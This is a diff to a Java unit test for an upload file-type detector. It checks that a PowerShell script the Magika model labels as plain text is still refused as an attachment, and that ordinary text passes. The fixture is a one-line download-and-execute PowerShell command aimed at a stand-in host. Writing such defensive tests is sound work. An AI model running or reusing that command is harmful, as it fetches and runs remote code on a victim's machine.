@@ -141,6 +141,37 @@ class FileTypeDetectorTest extends AbstractBaseTest {
     }
   }
 
+  /**
+   * docs/LEDGER_*.md SEC-53: since magika 0.7 a prediction below its threshold comes out as txt or
+   * unknown; the attachment blocklist still refuses what the model read.
+   */
+  @Nested
+  class LowConfidenceScripts {
+
+    @Test
+    void refusesAOneLinePowerShellScriptMagikaReportsAsText() throws IOException {
+      File script =
+          writeText("c.ps1", "Invoke-WebRequest -Uri http://x/a.ps1 -OutFile a.ps1; .\\a.ps1\n");
+      DetectedFileType detected = detector.detect(script, "c.ps1");
+      assertEquals("txt", detected.label(), "the case this guards: a label no blocklist names");
+      assertEquals("powershell", detected.modelLabel());
+      PedalonsException ex =
+          assertThrows(
+              PedalonsException.class,
+              () -> detector.detectAndValidate(script, "c.ps1", AssetType.ATTACHMENT));
+      assertEquals(ErrorCode.FILE_TYPE_REJECTED, ex.getErrorCode());
+    }
+
+    @Test
+    void stillAcceptsPlainText() throws IOException {
+      File note =
+          writeText("note.txt", "Bonjour, voici le compte-rendu de la sortie de dimanche.\n");
+      DetectedFileType detected =
+          detector.detectAndValidate(note, "note.txt", AssetType.ATTACHMENT);
+      assertEquals("text/plain", detected.mimeType());
+    }
+  }
+
   /** docs/LEDGER_*.md SEC-1: nothing a browser renders as a scripted document is stored. */
   @Nested
   class ActiveDocuments {
